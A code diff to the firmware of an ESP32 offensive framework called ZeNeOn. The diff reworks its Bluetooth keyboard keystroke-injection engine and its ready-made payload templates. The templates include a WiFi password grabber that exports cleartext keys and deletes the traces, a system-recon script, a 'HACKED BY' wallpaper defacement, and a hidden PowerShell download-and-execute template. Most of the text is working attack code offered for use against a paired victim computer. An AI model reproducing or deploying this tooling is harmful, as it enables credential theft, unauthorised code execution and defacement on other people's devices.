@@ -45,16 +45,18 @@ uint8_t eapolFramesDetected = 0;
 
 /* ============ PAYLOAD INJECTOR (BLE HID KEYBOARD) ============ */
 BleKeyboard bleKeyboard("ZeNeOn", "ZeNeOn Framework", 100);
-bool bleKbStarted = false;
+bool bleKbStarted = false;        // user-facing "active" flag
+bool bleNimbleReady = false;      // true after first bleKeyboard.begin() — never end() after this
 bool payloadExecuting = false;
 String payloadBuffer = "";
 int payloadOffset = 0;
 int payloadLinesExecuted = 0;
 int payloadTotalLines = 0;
-int payloadDefaultDelay = 100;
 unsigned long payloadNextExecTime = 0;
 String payloadStatus = "idle";
 String lastPayloadLine = "";
+unsigned long bleDisconnectTime = 0;  // millis() when disconnect detected (grace period)
+const unsigned long BLE_RECONNECT_GRACE_MS = 8000; // 8s grace before aborting
 
 /* ============ AUTOMATED ATTACK PHASES ============ */
 enum AttackPhase {
@@ -1647,7 +1649,7 @@ void restoreMainAP() {
   WiFi.softAPdisconnect(true);
   delay(200);
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP("ZeNeOn", "12345678", 1); // Restore on channel 1
+  WiFi.softAP("ZeNeOn", "88881234", 1); // Restore on channel 1
   delay(200);
   WiFi.softAPmacAddress(ownAPMAC);
   dnsServer.stop();
@@ -1765,77 +1767,81 @@ String getPhaseString() {
   }
 }
 
-/* ============ PAYLOAD INJECTOR — DUCKYSCRIPT PARSER ============ */
-uint8_t getKeyCode(String token) {
-  token.toUpperCase();
-  if (token == "ENTER" || token == "RETURN") return KEY_RETURN;
-  if (token == "ESC" || token == "ESCAPE") return KEY_ESC;
-  if (token == "BACKSPACE" || token == "BKSP") return KEY_BACKSPACE;
-  if (token == "TAB") return KEY_TAB;
-  if (token == "SPACE") return ' ';
-  if (token == "DELETE" || token == "DEL") return KEY_DELETE;
-  if (token == "INSERT") return KEY_INSERT;
-  if (token == "HOME") return KEY_HOME;
-  if (token == "END") return KEY_END;
-  if (token == "PAGEUP") return KEY_PAGE_UP;
-  if (token == "PAGEDOWN") return KEY_PAGE_DOWN;
-  if (token == "UP" || token == "UPARROW") return KEY_UP_ARROW;
-  if (token == "DOWN" || token == "DOWNARROW") return KEY_DOWN_ARROW;
-  if (token == "LEFT" || token == "LEFTARROW") return KEY_LEFT_ARROW;
-  if (token == "RIGHT" || token == "RIGHTARROW") return KEY_RIGHT_ARROW;
-  if (token == "CAPSLOCK") return KEY_CAPS_LOCK;
-  if (token == "PRINTSCREEN") return KEY_PRTSC;
-  if (token == "SCROLLLOCK") return 0x47;  // HID Scroll Lock
-  if (token == "PAUSE" || token == "BREAK") return 0x48;  // HID Pause
-  if (token == "CTRL" || token == "CONTROL") return KEY_LEFT_CTRL;
-  if (token == "SHIFT") return KEY_LEFT_SHIFT;
-  if (token == "ALT") return KEY_LEFT_ALT;
-  if (token == "GUI" || token == "WINDOWS" || token == "COMMAND" || token == "META" || token == "SUPER") return KEY_LEFT_GUI;
-  if (token == "F1") return KEY_F1;
-  if (token == "F2") return KEY_F2;
-  if (token == "F3") return KEY_F3;
-  if (token == "F4") return KEY_F4;
-  if (token == "F5") return KEY_F5;
-  if (token == "F6") return KEY_F6;
-  if (token == "F7") return KEY_F7;
-  if (token == "F8") return KEY_F8;
-  if (token == "F9") return KEY_F9;
-  if (token == "F10") return KEY_F10;
-  if (token == "F11") return KEY_F11;
-  if (token == "F12") return KEY_F12;
-  if (token == "MENU" || token == "APP") return 0x65;  // HID Menu/App key
-  if (token.length() == 1) return (uint8_t)token.charAt(0);
+/* ============ PAYLOAD INJECTOR — C++ KEYBOARD PARSER ============ */
+// Resolves Arduino Keyboard.h key constants to HID codes
+uint8_t resolveKeyConstant(String arg) {
+  arg.trim();
+  // Single char literal: 'r', 'A', ' ', etc.
+  if (arg.length() == 3 && arg.charAt(0) == '\'' && arg.charAt(2) == '\'') {
+    return (uint8_t)arg.charAt(1);
+  }
+  // Modifier keys
+  if (arg == "KEY_LEFT_GUI")   return KEY_LEFT_GUI;
+  if (arg == "KEY_LEFT_CTRL")  return KEY_LEFT_CTRL;
+  if (arg == "KEY_LEFT_SHIFT") return KEY_LEFT_SHIFT;
+  if (arg == "KEY_LEFT_ALT")   return KEY_LEFT_ALT;
+  if (arg == "KEY_RIGHT_GUI")  return KEY_LEFT_GUI;  // map to left
+  if (arg == "KEY_RIGHT_CTRL") return KEY_LEFT_CTRL;
+  if (arg == "KEY_RIGHT_SHIFT") return KEY_LEFT_SHIFT;
+  if (arg == "KEY_RIGHT_ALT")  return KEY_LEFT_ALT;
+  // Common keys
+  if (arg == "KEY_RETURN" || arg == "KEY_ENTER") return KEY_RETURN;
+  if (arg == "KEY_ESC" || arg == "KEY_ESCAPE")   return KEY_ESC;
+  if (arg == "KEY_BACKSPACE")  return KEY_BACKSPACE;
+  if (arg == "KEY_TAB")        return KEY_TAB;
+  if (arg == "KEY_SPACE")      return ' ';
+  if (arg == "KEY_DELETE")     return KEY_DELETE;
+  if (arg == "KEY_INSERT")     return KEY_INSERT;
+  if (arg == "KEY_HOME")       return KEY_HOME;
+  if (arg == "KEY_END")        return KEY_END;
+  if (arg == "KEY_PAGE_UP")    return KEY_PAGE_UP;
+  if (arg == "KEY_PAGE_DOWN")  return KEY_PAGE_DOWN;
+  if (arg == "KEY_CAPS_LOCK")  return KEY_CAPS_LOCK;
+  if (arg == "KEY_PRTSC")      return KEY_PRTSC;
+  if (arg == "KEY_SCROLL_LOCK") return 0x47;
+  if (arg == "KEY_PAUSE")      return 0x48;
+  if (arg == "KEY_MENU")       return 0x65;
+  // Arrow keys
+  if (arg == "KEY_UP_ARROW")    return KEY_UP_ARROW;
+  if (arg == "KEY_DOWN_ARROW")  return KEY_DOWN_ARROW;
+  if (arg == "KEY_LEFT_ARROW")  return KEY_LEFT_ARROW;
+  if (arg == "KEY_RIGHT_ARROW") return KEY_RIGHT_ARROW;
+  // Function keys
+  if (arg == "KEY_F1")  return KEY_F1;
+  if (arg == "KEY_F2")  return KEY_F2;
+  if (arg == "KEY_F3")  return KEY_F3;
+  if (arg == "KEY_F4")  return KEY_F4;
+  if (arg == "KEY_F5")  return KEY_F5;
+  if (arg == "KEY_F6")  return KEY_F6;
+  if (arg == "KEY_F7")  return KEY_F7;
+  if (arg == "KEY_F8")  return KEY_F8;
+  if (arg == "KEY_F9")  return KEY_F9;
+  if (arg == "KEY_F10") return KEY_F10;
+  if (arg == "KEY_F11") return KEY_F11;
+  if (arg == "KEY_F12") return KEY_F12;
+  // Hex literal (0xNN)
+  if (arg.startsWith("0x") || arg.startsWith("0X")) return (uint8_t)strtol(arg.c_str(), NULL, 16);
+  // Numeric literal
+  if (arg.length() > 0 && isDigit(arg.charAt(0))) return (uint8_t)arg.toInt();
   return 0;
 }
 
-void executeKeyCombo(String line) {
-  String tokens[10];
-  int tokenCount = 0;
-  String remaining = line;
-  remaining.trim();
-
-  while (remaining.length() > 0 && tokenCount < 10) {
-    int sp = remaining.indexOf(' ');
-    if (sp < 0) {
-      tokens[tokenCount++] = remaining;
-      remaining = "";
-    } else {
-      tokens[tokenCount++] = remaining.substring(0, sp);
-      remaining = remaining.substring(sp + 1);
-      remaining.trim();
-    }
+// Extract text between first and last double-quote in a string
+String extractQuotedString(String s) {
+  int first = s.indexOf('"');
+  int last = s.lastIndexOf('"');
+  if (first >= 0 && last > first) {
+    return s.substring(first + 1, last);
   }
-  if (tokenCount == 0) return;
+  return s; // fallback: return as-is
+}
 
-  for (int i = 0; i < tokenCount; i++) {
-    uint8_t key = getKeyCode(tokens[i]);
-    if (key) {
-      bleKeyboard.press(key);
-    }
-  }
-  delay(50);
-  bleKeyboard.releaseAll();
-  addEvent("PAYLOAD: " + line);
+// Extract argument from function call: "funcName(arg)" → "arg"
+String extractArg(String line, int prefixLen) {
+  // line = "Keyboard.press(KEY_LEFT_GUI)" with trailing ) already confirmed
+  String arg = line.substring(prefixLen, line.length() - 1);
+  arg.trim();
+  return arg;
 }
 
 String getNextPayloadLine() {
@@ -1853,51 +1859,117 @@ String getNextPayloadLine() {
   return line;
 }
 
-void executeDuckyLine(String line) {
+// Type a string char-by-char with delay to prevent BLE packet drops
+// Each write() sends 2 HID reports (press+release) — needs enough time
+// for both to transmit over BLE while sharing radio with WiFi
+void typeString(const char* str) {
+  while (*str) {
+    bleKeyboard.press((uint8_t)*str);
+    delay(15);
+    bleKeyboard.release((uint8_t)*str);
+    delay(15);
+    str++;
+  }
+}
+
+// Execute one line of C++ Keyboard.h style payload
+void executeLine(String line) {
+  if (line.length() == 0) return;
+  // Strip trailing semicolon
+  if (line.endsWith(";")) line = line.substring(0, line.length() - 1);
+  line.trim();
   if (line.length() == 0) return;
   lastPayloadLine = line;
 
-  if (line.startsWith("REM")) return;
+  // Comments
+  if (line.startsWith("//")) return;
+  // Braces (ignored)
+  if (line == "{" || line == "}") return;
+  // void setup() / void loop() / #include — skip structural lines
+  if (line.startsWith("void ") || line.startsWith("#include")) return;
 
-  if (line.startsWith("DELAY ")) {
-    int d = line.substring(6).toInt();
-    payloadNextExecTime = millis() + d;
-    addEvent("PAYLOAD: DELAY " + String(d) + "ms");
+  // delay(ms)
+  if (line.startsWith("delay(") && line.endsWith(")")) {
+    int d = extractArg(line, 6).toInt();
+    if (d > 0) {
+      payloadNextExecTime = millis() + d;
+      addEvent("PAYLOAD: delay(" + String(d) + ")");
+    }
     return;
   }
 
-  if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
-    payloadDefaultDelay = line.substring(line.indexOf(' ') + 1).toInt();
-    addEvent("PAYLOAD: DEFAULT_DELAY " + String(payloadDefaultDelay) + "ms");
+  // Keyboard.begin() — no-op (BLE already started)
+  if (line == "Keyboard.begin()") {
+    addEvent("PAYLOAD: Keyboard.begin()");
     return;
   }
 
-  if (line.startsWith("STRING ")) {
-    String text = line.substring(7);
-    bleKeyboard.print(text);
-    addEvent("PAYLOAD: STRING [" + String(text.length()) + " chars]");
+  // Keyboard.end() — no-op (BLE stays running)
+  if (line == "Keyboard.end()") {
+    addEvent("PAYLOAD: Keyboard.end()");
     return;
   }
 
-  if (line.startsWith("STRINGLN ")) {
-    String text = line.substring(9);
-    bleKeyboard.println(text);
-    addEvent("PAYLOAD: STRINGLN [" + String(text.length()) + " chars]");
+  // Keyboard.releaseAll()
+  if (line == "Keyboard.releaseAll()") {
+    bleKeyboard.releaseAll();
+    addEvent("PAYLOAD: releaseAll()");
     return;
   }
 
-  if (line == "REPEAT" || line.startsWith("REPEAT ")) {
-    int count = 1;
-    if (line.startsWith("REPEAT ")) count = line.substring(7).toInt();
-    if (count < 1) count = 1;
-    // Re-execute the last non-REPEAT line
-    // (simplified — just re-runs it once)
-    addEvent("PAYLOAD: REPEAT x" + String(count));
+  // Keyboard.press(KEY_*) or Keyboard.press('c')
+  if (line.startsWith("Keyboard.press(") && line.endsWith(")")) {
+    String arg = extractArg(line, 15);
+    uint8_t key = resolveKeyConstant(arg);
+    if (key) {
+      bleKeyboard.press(key);
+      addEvent("PAYLOAD: press(" + arg + ")");
+    }
     return;
   }
 
-  // Everything else: key combo (ENTER, GUI r, CTRL ALT DELETE, etc.)
-  executeKeyCombo(line);
+  // Keyboard.release(KEY_*) or Keyboard.release('c')
+  if (line.startsWith("Keyboard.release(") && line.endsWith(")")) {
+    String arg = extractArg(line, 17);
+    uint8_t key = resolveKeyConstant(arg);
+    if (key) {
+      bleKeyboard.release(key);
+      addEvent("PAYLOAD: release(" + arg + ")");
+    }
+    return;
+  }
+
+  // Keyboard.write(KEY_*) or Keyboard.write('c')
+  if (line.startsWith("Keyboard.write(") && line.endsWith(")")) {
+    String arg = extractArg(line, 15);
+    uint8_t key = resolveKeyConstant(arg);
+    if (key) {
+      bleKeyboard.write(key);
+      addEvent("PAYLOAD: write(" + arg + ")");
+    }
+    return;
+  }
+
+  // Keyboard.println("text") — check BEFORE print
+  if (line.startsWith("Keyboard.println(") && line.endsWith(")")) {
+    String text = extractQuotedString(line);
+    typeString(text.c_str());
+    bleKeyboard.write(KEY_RETURN);
+    delay(4);
+    addEvent("PAYLOAD: println [" + String(text.length()) + " chars]");
+    return;
+  }
+
+  // Keyboard.print("text")
+  if (line.startsWith("Keyboard.print(") && line.endsWith(")")) {
+    String text = extractQuotedString(line);
+    typeString(text.c_str());
+    addEvent("PAYLOAD: print [" + String(text.length()) + " chars]");
+    return;
+  }
+
+  // Unknown line — log it
+  addEvent("PAYLOAD: ? " + line);
 }
 
 int countPayloadLines(String &buf) {
@@ -1917,7 +1989,7 @@ String payloadInjectorUI() {
   return header() + R"rawliteral(
 <div class="card">
 <h3>⌨ Payload Injector (BLE)</h3>
-<p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Pair the target device with <strong>"ZeNeOn"</strong> then inject DuckyScript payloads via BLE keystroke injection.</p>
+<p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Pair the target device with <strong>"ZeNeOn"</strong> then inject C++ Keyboard payloads via BLE keystroke injection.</p>
 <div id="bleStatus" class="status">BLE Keyboard not started</div>
 <div class="grid">
 <button class="success" onclick="startBLE()" id="startBtn">⚡ Start BLE Keyboard</button>
@@ -1927,7 +1999,7 @@ String payloadInjectorUI() {
 
 <div class="card" id="payloadCard">
 <h3>Payload Terminal</h3>
-<p style="margin-bottom:8px;opacity:0.7;font-size:12px">Enter DuckyScript payload — keystrokes will be typed on the paired device</p>
+<p style="margin-bottom:8px;opacity:0.7;font-size:12px">Write C++ Keyboard.h style payload — keystrokes will be typed on the paired device</p>
 <div style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;overflow:hidden">
 <div style="display:flex;align-items:center;padding:5px 10px;background:rgba(0,40,80,0.4);border-bottom:1px solid rgba(0,100,255,0.2)">
 <div style="width:7px;height:7px;border-radius:50%;background:#ff3b30;margin-right:5px"></div>
@@ -1935,14 +2007,17 @@ String payloadInjectorUI() {
 <div style="width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:8px"></div>
 <span style="font-size:11px;color:#5599cc;letter-spacing:1px">payload_editor</span>
 </div>
-<textarea id="payload" rows="14" style="width:100%;background:#020408;color:#00ff88;border:none;font-family:'Courier New',monospace;padding:12px;font-size:13px;resize:vertical;outline:none;line-height:1.6" spellcheck="false" placeholder="REM Example: Open Notepad and type text
-DELAY 1000
-GUI r
-DELAY 500
-STRING notepad
-ENTER
-DELAY 1000
-STRING Hello from ZeNeOn!"></textarea>
+<textarea id="payload" rows="14" style="width:100%;background:#020408;color:#00ff88;border:none;font-family:'Courier New',monospace;padding:12px;font-size:13px;resize:vertical;outline:none;line-height:1.6" spellcheck="false" placeholder="// Example: Open Notepad and type text
+delay(1000);
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+delay(80);
+Keyboard.releaseAll();
+delay(500);
+Keyboard.print(&quot;notepad&quot;);
+Keyboard.write(KEY_RETURN);
+delay(1000);
+Keyboard.print(&quot;Hello from ZeNeOn!&quot;);"></textarea>
 </div>
 <div class="grid" style="margin-top:10px">
 <button onclick="injectPayload()" id="injectBtn">🚀 Execute Payload</button>
@@ -1992,19 +2067,25 @@ STRING Hello from ZeNeOn!"></textarea>
 </div>
 
 <div class="card">
-<h3>DuckyScript Reference</h3>
+<h3>C++ Keyboard.h Reference</h3>
 <div style="font-size:12px;color:#5599cc;line-height:2;column-count:2;column-gap:16px">
-<code style="color:#00ff88">STRING text</code> Type text<br>
-<code style="color:#00ff88">STRINGLN text</code> Type + Enter<br>
-<code style="color:#00ff88">DELAY ms</code> Wait (ms)<br>
-<code style="color:#00ff88">ENTER</code> Press Enter<br>
-<code style="color:#00ff88">GUI r</code> Win + R<br>
-<code style="color:#00ff88">CTRL ALT DELETE</code> Combo<br>
-<code style="color:#00ff88">TAB</code> <code style="color:#00ff88">ESC</code> <code style="color:#00ff88">SPACE</code><br>
-<code style="color:#00ff88">UP DOWN LEFT RIGHT</code><br>
-<code style="color:#00ff88">F1</code>-<code style="color:#00ff88">F12</code> Function keys<br>
-<code style="color:#00ff88">REM comment</code> Comment<br>
-<code style="color:#00ff88">DEFAULT_DELAY ms</code> Auto delay
+<code style="color:#00ff88">Keyboard.press(KEY)</code> Hold key<br>
+<code style="color:#00ff88">Keyboard.release(KEY)</code> Release<br>
+<code style="color:#00ff88">Keyboard.releaseAll()</code> Release all<br>
+<code style="color:#00ff88">Keyboard.write(KEY)</code> Tap key<br>
+<code style="color:#00ff88">Keyboard.print("text")</code> Type text<br>
+<code style="color:#00ff88">Keyboard.println("text")</code> + Enter<br>
+<code style="color:#00ff88">delay(ms)</code> Wait (ms)<br>
+<code style="color:#00ff88">//</code> Comment line<br>
+<code style="color:#00ff88">KEY_LEFT_GUI</code> Windows key<br>
+<code style="color:#00ff88">KEY_LEFT_CTRL</code> Ctrl key<br>
+<code style="color:#00ff88">KEY_LEFT_SHIFT</code> Shift key<br>
+<code style="color:#00ff88">KEY_LEFT_ALT</code> Alt key<br>
+<code style="color:#00ff88">KEY_RETURN</code> Enter key<br>
+<code style="color:#00ff88">KEY_ESC</code> <code style="color:#00ff88">KEY_TAB</code><br>
+<code style="color:#00ff88">KEY_UP_ARROW</code> Arrow keys<br>
+<code style="color:#00ff88">KEY_F1</code>-<code style="color:#00ff88">KEY_F12</code><br>
+<code style="color:#00ff88">'r'</code> <code style="color:#00ff88">'a'</code> Single chars
 </div>
 </div>
 
@@ -2078,7 +2159,7 @@ var startBlePoll=function(){
         document.getElementById('execStatus').innerHTML='✓ Payload execution complete! ('+d.linesExec+' lines)';
       }
     }).catch(function(){});
-  },1000);
+  },2500);
 }
 var injectPayload=function(){
   var pl=document.getElementById('payload').value;
@@ -2125,9 +2206,9 @@ var startExecPoll=function(){
         d.logs.forEach(function(l){
           if(l.indexOf('PAYLOAD')>=0){
             var c='#00cc66';
-            if(l.indexOf('STRING')>=0) c='#00ff88';
-            if(l.indexOf('DELAY')>=0) c='#ffaa00';
-            if(l.indexOf('KEY')>=0||l.indexOf('GUI')>=0||l.indexOf('CTRL')>=0) c='#00d4ff';
+            if(l.indexOf('print')>=0||l.indexOf('println')>=0) c='#00ff88';
+            if(l.indexOf('delay')>=0) c='#ffaa00';
+            if(l.indexOf('press')>=0||l.indexOf('release')>=0||l.indexOf('write')>=0) c='#00d4ff';
             if(l.indexOf('COMPLETE')>=0||l.indexOf('DONE')>=0) c='#00ff88';
             if(l.indexOf('ERROR')>=0||l.indexOf('ABORT')>=0) c='#ff4444';
             addExecLog(l,c);
@@ -2162,34 +2243,34 @@ var loadTemplate=function(id){
   var t='';
   switch(id){
     case 1:
-      t="REM Open Notepad and type a message\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING Hello from ZeNeOn Payload Injector!\nENTER\nSTRING This was typed via BLE keyboard injection.\n";
+      t="// Open Notepad and type a message\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"notepad\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"Hello from ZeNeOn Payload Injector!\");\nKeyboard.write(KEY_RETURN);\nKeyboard.print(\"This was typed via BLE keyboard injection.\");\n";
       break;
     case 2:
-      t="REM Open PowerShell\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Write-Host 'ZeNeOn Payload Injector Active'\nENTER\n";
+      t="// Open PowerShell\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"powershell\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.print(\"Write-Host 'ZeNeOn Payload Injector Active'\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 3:
-      t="REM Open CMD and run commands\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING echo ZeNeOn Framework Active\nENTER\nSTRING ipconfig\nENTER\n";
+      t="// Open CMD and run commands\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"echo ZeNeOn Framework Active\");\nKeyboard.write(KEY_RETURN);\nKeyboard.print(\"ipconfig\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 4:
-      t="REM Lock the Windows PC\nDELAY 500\nGUI l\n";
+      t="// Lock the Windows PC\ndelay(500);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('l');\ndelay(80);\nKeyboard.releaseAll();\n";
       break;
     case 5:
-      t="REM WiFi Password Grabber — exports WiFi profiles and shows passwords\nREM Opens a small CMD window, extracts creds, then closes\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k mode con: cols=25 lines=1\nENTER\nDELAY 700\nSTRING cd %temp%\nENTER\nDELAY 200\nSTRING netsh wlan export profile key=clear\nENTER\nDELAY 2000\nSTRING powershell \"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+' | Pass: '+$p}; $x | Out-File wifi_dump.txt; notepad wifi_dump.txt\"\nENTER\nDELAY 3000\nSTRING del Wi*.xml /s/f/q\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      t="// WiFi Password Grabber\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd /k mode con: cols=25 lines=1\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(700);\nKeyboard.print(\"cd %temp%\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"netsh wlan export profile key=clear\");\nKeyboard.write(KEY_RETURN);\ndelay(2000);\nKeyboard.print(\"powershell \\\"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+' | Pass: '+$p}; $x | Out-File wifi_dump.txt; notepad wifi_dump.txt\\\"\");\nKeyboard.write(KEY_RETURN);\ndelay(3000);\nKeyboard.print(\"del Wi*.xml /s/f/q\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 6:
-      t="REM System Recon — gather system info to a text file\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING echo === SYSTEM INFO === > %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING hostname >> %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING whoami >> %temp%\\recon.txt\nENTER\nDELAY 100\nSTRING ipconfig /all >> %temp%\\recon.txt\nENTER\nDELAY 500\nSTRING netsh wlan show profiles >> %temp%\\recon.txt\nENTER\nDELAY 500\nSTRING systeminfo >> %temp%\\recon.txt\nENTER\nDELAY 3000\nSTRING notepad %temp%\\recon.txt\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      t="// System Recon\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"echo === SYSTEM INFO === > %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"hostname >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"whoami >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"ipconfig /all >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.print(\"netsh wlan show profiles >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.print(\"systeminfo >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(3000);\nKeyboard.print(\"notepad %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 7:
-      t="REM Create a folder on desktop\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING mkdir %userprofile%\\Desktop\\ZeNeOn_Was_Here\nENTER\nDELAY 200\nSTRING echo You have been visited by ZeNeOn > %userprofile%\\Desktop\\ZeNeOn_Was_Here\\readme.txt\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      t="// Create a folder on desktop\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"mkdir %userprofile%\\\\Desktop\\\\ZeNeOn_Was_Here\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"echo You have been visited by ZeNeOn > %userprofile%\\\\Desktop\\\\ZeNeOn_Was_Here\\\\readme.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 8:
-      t="REM Open a website in default browser\nDELAY 1000\nGUI r\nDELAY 500\nSTRING https://github.com/InoshMatheesha/ZeNeOn-ESP32-WiFi-Framework\nENTER\n";
+      t="// Open a website in default browser\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"https://github.com/InoshMatheesha/ZeNeOn-ESP32-WiFi-Framework\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 9:
-      t="REM Change wallpaper message via PowerShell\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1500\nSTRING Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; $f=[System.IO.Path]::GetTempPath()+'wp.bmp'; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap(1920,1080); $g=[System.Drawing.Graphics]::FromImage($b); $g.Clear([System.Drawing.Color]::Black); $g.DrawString('HACKED BY ZeNeOn',(New-Object System.Drawing.Font('Consolas',48)),[System.Drawing.Brushes]::Lime,(New-Object System.Drawing.PointF(300,450))); $b.Save($f); [W]::SystemParametersInfo(20,0,$f,3)\nENTER\nDELAY 2000\nSTRING exit\nENTER\n";
+      t="// Change wallpaper message via PowerShell\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"powershell\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.print(\"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; $f=[System.IO.Path]::GetTempPath()+'wp.bmp'; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap(1920,1080); $g=[System.Drawing.Graphics]::FromImage($b); $g.Clear([System.Drawing.Color]::Black); $g.DrawString('HACKED BY ZeNeOn',(New-Object System.Drawing.Font('Consolas',48)),[System.Drawing.Brushes]::Lime,(New-Object System.Drawing.PointF(300,450))); $b.Save($f); [W]::SystemParametersInfo(20,0,$f,3)\");\nKeyboard.write(KEY_RETURN);\ndelay(2000);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 10:
-      t="REM Download and execute — TEMPLATE (edit URL and filename)\nREM Replace YOUR_URL with actual download link\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden\nENTER\nDELAY 1500\nSTRING Invoke-WebRequest -Uri 'YOUR_URL_HERE' -OutFile $env:TEMP\\payload.exe; Start-Process $env:TEMP\\payload.exe\nENTER\nDELAY 200\nSTRING exit\nENTER\n";
+      t="// Download and execute (edit URL)\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"powershell -w hidden\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.print(\"Invoke-WebRequest -Uri 'YOUR_URL_HERE' -OutFile $env:TEMP\\\\payload.exe; Start-Process $env:TEMP\\\\payload.exe\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
   }
   document.getElementById('payload').value=t;
@@ -2358,7 +2439,7 @@ void setupRoutes() {
     Serial.printf("[*] Restarting AP on target channel %d...\n", targetChannel);
     WiFi.softAPdisconnect(true);
     delay(200);
-    WiFi.softAP("ZeNeOn", "12345678", targetChannel);
+    WiFi.softAP("ZeNeOn", "88881234", targetChannel);
     delay(300);
     // Restart DNS so captive portal detection works on reconnect
     dnsServer.stop();
